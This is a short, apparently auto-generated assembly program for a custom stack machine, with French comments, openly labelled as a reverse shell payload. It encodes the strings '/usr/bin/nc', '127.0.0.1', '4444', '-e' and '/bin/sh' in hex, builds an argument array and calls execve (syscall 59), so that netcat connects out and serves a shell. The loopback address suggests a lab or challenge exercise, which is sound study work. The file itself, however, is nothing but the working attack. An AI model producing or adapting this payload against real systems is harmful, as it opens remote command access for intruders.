; === REVERSE SHELL PAYLOAD ===
; Generé automatiquement
; String: '/usr/bin/nc' à l'adresse 50
PUSH 0x6E69622F7273752F
STORE 50
PUSH 0x636E2F
STORE 51
; String: '127.0.0.1' à l'adresse 52
PUSH 0x2E302E302E373231
STORE 52
PUSH 0x31
STORE 53
; String: '4444' à l'adresse 54
PUSH 0x34343434
STORE 54
; String: '-e' à l'adresse 55
PUSH 0x652D
STORE 55
; String: '/bin/sh' à l'adresse 56
PUSH 0x68732F6E69622F
STORE 56
; --- Construction de argv[] à l'adresse 10 ---
PUSH 50
STORE 10
PUSH 52
STORE 11
PUSH 54
STORE 12
PUSH 55
STORE 13
PUSH 56
STORE 14
PUSH 0
STORE 15
; --- Appel SYSCALL ---
PUSH 0
PUSH 10
PUSH 50
PUSH 59
SYS
HALT